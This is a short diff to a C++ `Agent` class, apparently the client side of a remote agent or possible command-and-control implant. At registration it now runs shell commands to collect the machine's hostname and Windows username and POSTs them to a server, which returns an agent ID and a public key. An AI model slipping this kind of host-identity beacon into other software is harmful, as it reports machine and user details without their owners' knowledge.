@@ -13,7 +13,17 @@
 using json = nlohmann::json;
 
 Agent::Agent() {
-  cpr::Response r = cpr::Post(endpointUrl("/api/agents/register"));
+  RegisterInfo info;
+  info.hostname = sanitizeEscapes(exec("hostname"));
+  info.username = sanitizeEscapes(exec("echo %USERNAME%"));
+
+  json jsonInfo = {
+      {"Hostname", info.hostname},
+      {"Username", info.username},
+  };
+
+  cpr::Response r = cpr::Post(endpointUrl("/api/agents/register"),
+                              cpr::Body{jsonInfo.dump()});
   json registerData = json::parse(r.text);
   agentId_ = registerData["AgentId"];
   publicKey_ = registerData["PublicKey"];
